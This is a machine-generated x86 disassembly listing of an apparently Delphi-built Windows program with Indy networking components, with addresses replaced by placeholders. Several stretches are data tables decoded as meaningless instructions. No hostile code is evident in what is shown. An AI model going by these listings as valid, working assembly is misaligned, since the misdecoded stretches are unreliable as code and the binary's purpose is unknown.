cmp edi [ esp + 0x4 ]
jle r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
mov bl [ eax ]
inc eax
mov [ esp + 0x8 ] eax
mov esi [ esp ]
mov ebp edi
dec ebp
mov edi [ esp + 0x4 ]
sub edi ebp
test ebp ebp
jne r-xdata
test edi edi
jle r-xdata
test edi edi
jle r-xdata
xor eax eax
cmp bl [ esi ]
jne r-xdata
cmp bl [ esi ]
jne r-xdata
inc esi
inc esi
mov ecx ebp
mov edx [ esp + 0x8 ]
mov eax esi
call sub_407bec
test al al
je r-xdata
inc esi
dec edi
test edi edi
jg r-xdata
mov eax esi
sub eax [ esp ]
inc eax
jmp r-xdata
dec edi
test edi edi
jg r-xdata
mov eax esi
sub eax [ esp ]
jmp r-xdata
jmp r-xdata
sub_462a2c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_462adf
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462ae6
retn
mov eax rw-data
call sub_40d1c0
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404980
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404980
mov eax rw-data
call sub_403ef8
mov eax rw-data
mov edx [ r-xdata ]
call sub_404eb8
mov eax rw-data
mov edx [ r-xdata ]
call sub_404eb8
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404980
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404980
sub_462ae8
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_462bbb
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462bc2
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
lea eax [ ebp - 0x4 ]
call sub_4626b0
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403f4c
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov edx r-xdata
mov cl 0x20
call sub_402c64
jne r-xdata
mov eax sub_40c384
mov [ rw-data ] eax
mov [ rw-data ] sub_462998
jmp r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404eac
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403f4c
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404eac
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403f4c
sub_462e75
sub eax 0x2c980046
inc esi
add [ esi ] al
add [ ebx ] cl
dec ecx
dec ecx
outsb
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090004 ] al
outsb
push edx
arpl [ gs : ebp + 0x69 ] sp
jbe sub_462f60
jb r-xdata
dec eax
sub eax 0x580046
jo r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
add bh bh
pop eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060005 ] al
outsb
push ebx
outsb
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4a ] 0x0
je r-xdata
add [ eax ] bl
add al 0x0
add al 0x2d
inc esi
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090002 ] al
outsb
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + eax + 0x2d ] si
inc esi
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0003 ] al
outsb
inc esp
imul esi [ ebx + 0x63 ] 0x656e6e6f
arpl [ eax + ecx * 2 + 0x2d ] si
inc esi
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_462f1c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4a ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_462f3c
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x30 ] esi
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_462f60
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41aa7c
mov [ esi + 0x38 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_462f9c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx + 0x52 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
push 0x0
push 0x0
mov eax esi
call sub_416680
sub_462fcc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
push 0x0
push 0x0
mov eax esi
call sub_416680
sub_462ffc
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41ad98
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x34 ]
jne r-xdata
xor eax eax
mov [ esi + 0x34 ] eax
sub_463070
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_463095
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46309c
retn
sub_4630ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
xor [ esi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ecx ] dh
inc esi
add [ eax + eax ] bh
add [ eax ] al
or [ esi + eax * 2 ] ch
add ah ch
mov cl 0x41
add [ eax + 0x33 ] bh
inc eax
add [ eax - 0x55 ] al
inc ecx
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
les esi [ edx ]
inc esi
add [ eax ] al
dec eax
inc ecx
add ah dh
lodsd [ esi ]
inc ecx
add [ edi + eax * 2 ] bl
inc ecx
add ah cl
scasb [ edi ]
inc ecx
add [ eax - 0x23ffbe53 ] bl
scasb [ edi ]
inc ecx
add ah dl
scasd [ edi ]
inc ecx
add [ edx + esi * 4 ] al
inc ecx
add ah ch
scasb [ edi ]
inc ecx
add ah ah
scasb [ edi ]
inc ecx
add [ edx + esi * 4 ] cl
inc ecx
add [ eax ] dl
xor al [ esi ]
push 0x11004029
push esp
dec ecx
inc ecx
outsb
je r-xdata
xor [ eax ] eax
inc esi
jb r-xdata
and eax 0x8bfffa02
fimul [ ebx + 0x55c033f0 ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
add eax [ eax ]
push ss
inc ecx
jo r-xdata
push [ ecx ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jpe r-xdata
mov [ rw-data ] esi
cmp [ rw-data ] 0x0
je r-xdata
dec ecx
insb
jb r-xdata
add bh bh
add [ eax ] eax
inc edx
popad
jae r-xdata
mov [ esi + 0x30 ] 0x1
mov [ esi + 0x31 ] 0x1
mov [ esi + 0x34 ] 0xfa
mov [ esi + 0x38 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4632a6
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
push sub_46329f
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_41aa7c
test [ esi + 0x1c ] 0x10
mov ebx edx
mov esi eax
xor eax eax
add esp 0xfffffff0
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
mov eax eax
inc eax
xor [ esi ] eax
pop es
adc [ ecx + ecx * 2 + 0x64 ] edx
inc ecx
outsb
je r-xdata
push ebp
je r-xdata
popad
je r-xdata
inc esi
jb r-xdata
js r-xdata
push esp
adc [ eax ] al
xor al 0x0
add bh bh
xor al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xfa ] al
add al 0x0
or ecx [ ecx + 0x64 ]
insb
push esp
imul ebp [ ebp + 0x65 ] 0x74754f
adc [ eax ] al
cmp [ eax ] al
add bh bh
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax 0x6e4f0c00
insb
jns r-xdata
call sub_403448
dec eax
outsd
outsb
arpl [ ecx + 0x74 ] sp
jpe r-xdata
je r-xdata
push esi
inc esi
sbb al 0x10
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp r-xdata
nop
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
push 0x64496e65
insb
imul ebp [ edi + 0x6e ] 0x50736148
inc edx
popad
jae r-xdata
popad
jae r-xdata
hlt
sub_4632c4
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41aac8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_4632f0
push ebx
push esi
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
mov eax esi
call sub_463334
test al al
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x38 ] 0x0
sete al
or bl al
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
sub_463334
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
call sub_462984
test al al
jne r-xdata
test al al
je r-xdata
mov al 0x1
retn
mov eax [ rw-data ]
mov al [ eax + 0x30 ]
sub_46335c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_463381
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463388
retn
sub_4636a8
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41aa7c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_46371a
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ rw-data ] 0x1
jne r-xdata
add esp 0xfffffff0
call sub_403448
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463721
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ r-xdata ]
call sub_460ca4
mov edx [ rw-data ]
mov [ edx ] eax
sub_463740
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4034b0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_41aac8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_4637a7
push [ fs : eax ]
mov [ fs : eax ] esp
dec [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4637ae
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ rw-data ]
call sub_40d1c0
sub_4637cc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_463877
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi + 0x32 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46387e
lea eax [ ebp - 0x10 ]
call sub_403ef8
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov eax [ ebp + 0x8 ]
inc eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov edx edi
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
mov ecx [ ebp + 0x8 ]
call sub_408d28
mov eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
lea eax [ ebp - 0x4 ]
push eax
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
xor ecx ecx
call sub_408d28
mov eax [ ebp - 0x4 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
jmp r-xdata
sub_463888
push ebx
push esi
xor ebx ebx
mov bl dl
lea ebx [ ebx + ebx * 2 ]
inc [ eax + ebx * 4 + 0x58 ]
cmp [ eax + ebx * 4 + 0x58 ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov [ eax + ebx * 4 + 0x54 ] ecx
xor esi esi
mov [ eax + ebx * 4 + 0x50 ] esi
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_4638c0
push ebx
push esi
xor ebx ebx
mov bl dl
lea esi [ ebx + ebx * 2 ]
cmp [ eax + esi * 4 + 0x58 ] 0x0
jle r-xdata
pop esi
pop ebx
retn
add [ eax + esi * 4 + 0x50 ] ecx
cmp [ eax + 0x3a ] 0x0
je r-xdata
mov ecx [ eax + esi * 4 + 0x50 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4638f0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
mov al bl
lea edi [ eax + eax * 2 ]
cmp [ esi + edi * 4 + 0x58 ] 0x1
jne r-xdata
dec [ esi + edi * 4 + 0x58 ]
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x4a ] 0x0
je r-xdata
mov ecx ebx
mov edx esi
mov eax [ esi + 0x4c ]
call [ esi + 0x48 ]
sub_463920
or [ eax ] eax
add [ eax ] al
push 0x78004794
xchg edi eax
inc edi
add [ esp + edx * 4 + 0x47 ] ah
add [ eax - 0x69 ] bh
inc edi
add [ eax - 0x6c ] ah
inc edi
add [ eax - 0x69 ] bh
inc edi
add [ esp + edx * 4 + 0x47 ] bl
add [ eax - 0x69 ] bh
inc edi
add [ eax - 0x6c ] bl
inc edi
add ah ah
xchg edi eax
inc edi
add [ esp + edx * 4 + 0x47 ] dl
add [ edx + ebx * 4 ] cl
inc edi
add [ eax - 0x6c ] dl
inc edi
add al ch
xchg ebp eax
inc edi
add [ esp + edx * 4 + 0x47 ] cl
add [ eax + ebx * 4 + 0x47 ] dh
add [ eax - 0x6c ] cl
inc edi
add [ esi + edx * 4 + 0x47 ] bh
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4639a8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4639af
retn
mov eax rw-data
mov ecx 0x9
mov edx [ r-xdata ]
call sub_404980
sub_4639e0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
cmp al [ esi ]
test [ edx ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x3a ] ch
inc esi
add [ eax + eax ] ch
add [ eax ] al
rcr [ 0x336c0041 ] 0x40
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
je r-xdata
add [ eax ] al
add [ eax + edx + 0x180040 ] ch
add [ eax ] al
andps xmm1 [ ecx + 0x64 ]
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
inc esi
add [ eax ] al
dec eax
inc ecx
add [ eax ] cl
dec eax
inc ecx
add [ eax ] dh
inc ecx
inc esi
add [ eax ] bl
dec ebx
inc ecx
add al bh
dec ebx
inc ecx
add [ eax ] ch
dec esp
inc ecx
add [ eax ] ah
dec esp
inc ecx
add [ edi + edi + 0x3d080046 ] dl
inc esi
add [ edi + 0x3e2c0046 ] bh
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
sbb [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
popad
outsb
insb
mov eax eax
test [ edx ] bh
inc esi
add [ edi ] al
andps xmm1 [ ecx + 0x64 ]
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
[ eax + eax ]
outsd
jb r-xdata
push esp
adc [ eax ] al
sub [ eax ] al
add bh bh
sub [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
or eax 0x65696c43
popad
outsb
insb
sub [ gs : edx ] bh
inc esi
add [ esi + ebx + 0x41 ] cl
add [ eax + eax ] al
push cs
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
cmp eax [ esi ]
or al 0x0
add [ eax ] al
cmp al 0x3b
inc esi
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
mov [ ebx ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00463b ] cl
add [ eax ] al
add [ eax + ebp * 8 ] dl
dec ebp
imul ebp [ esi + 0x54 ] 0x28004010
add [ eax ] al
[ eax ]
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebx ] bh
inc esi
add [ eax + eax ] cl
add [ eax ] al
adc al 0xe8
outsd
jb r-xdata
outsb
je r-xdata
add [ 0x65696c43 ] cl
add [ eax ] al
or eax 0x65696c43
outsb
je r-xdata
popad
outsb
insb
jb r-xdata
dec esi
outsd
je r-xdata
inc eax
add [ 0x43644945 ] dl
outsd
jne r-xdata
add [ ebx + esi + 0x40 ] dh
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
popad
outsb
insb
inc ebp
jb r-xdata
inc eax
add [ eax * 2 + 0x6f536449 ] dl
xor eax [ eax ]
xor [ ebx ] 0x40
add [ ebx + esi + 0x40 ] dh
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
dec ebp
popad
js r-xdata
add [ ebx - 0xf7743d ] ecx
push ecx
and [ eax + 0x7400107b ] al
or [ edx - 0x173c74ff ] esi
xlat
add al 0x0
add [ ecx + rw-data ] ah
dec ecx
outsb
push edx
popad
outsb
lea eax [ bx + si ]
mov eax 0x463c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00463c ] bh
add [ eax ] al
add [ ebx + edi ] bh
inc esi
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ eax ] bl
inc ebp
dec ecx
inc ebx
popad
outsb
dec esi
outsd
je r-xdata
imul ebp [ esi + 0x64 ] 0x6b636f53
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3c ] dl
inc esi
add [ eax + eax ] cl
add [ eax ] al
cmp al 0x3b
inc esi
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
outsd
jb r-xdata
add al 0x0
push esp
adc [ eax ] al
and al 0x0
add bh bh
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
add [ eax ] eax
adc [ eax ] al
adc al 0x0
add bh bh
adc al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add cl [ ecx + 0x50 ]
push esp
adc [ eax ] al
sbb al 0x0
add bh bh
sbb al 0x0
add [ ebx + 0x308b0c53 ] cl
call [ esi + 0x64 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
retn
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x61527472
outsb
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax [ eax ]
jl r-xdata
imul ebp [ esi + 0x64 ] 0x74726f50
arpl [ ebx + 0x65 ] bp
je r-xdata
rcl [ eax + 0x3c ] 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x50
outsd
jb r-xdata
inc eax
add ah ch
cmp eax [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax [ eax ]
mov ecx edi
mov edx esi
call sub_460bb8
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl 0x1
mov eax ebx
call sub_4641c4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ ebx ] dl
inc ebp
dec ecx
dec ecx
outsb
jbe r-xdata
inc eax
sub_463ccc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
call sub_460bb8
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_4641c4
sub_463d3c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edx
mov edx [ ebx + 0xc ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_46417c
mov eax ebx
call sub_4641a0
sub_463d74
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414aac
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_463da4
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x48 ]
pop ebx
pop ebp
retn 0x4
sub_463dc8
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x54 ]
pop ebx
pop ebp
retn 0x4
sub_463dec
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx esi
mov edx [ ebx + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x5c ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460b64
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_463e2c
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x4c ]
pop ebx
pop ebp
retn 0xc
sub_463e58
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_463f6c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax ebx
call sub_4641f4
test al al
jne r-xdata
cmp [ ebx + 0x24 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463f73
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f1c
retn
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov eax [ ebx + 0x24 ]
cmp eax [ ebx + 0x28 ]
jle r-xdata
mov eax ebx
call sub_464248
test al al
jne r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebx + 0x28 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_4038b0
jmp r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebx + 0x28 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_4038b0
jmp r-xdata
sub_463f78
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebx + 0x18 ]
mov edx esi
call sub_403f4c
mov [ ebx + 0x20 ] edi
pop edi
pop esi
pop ebx
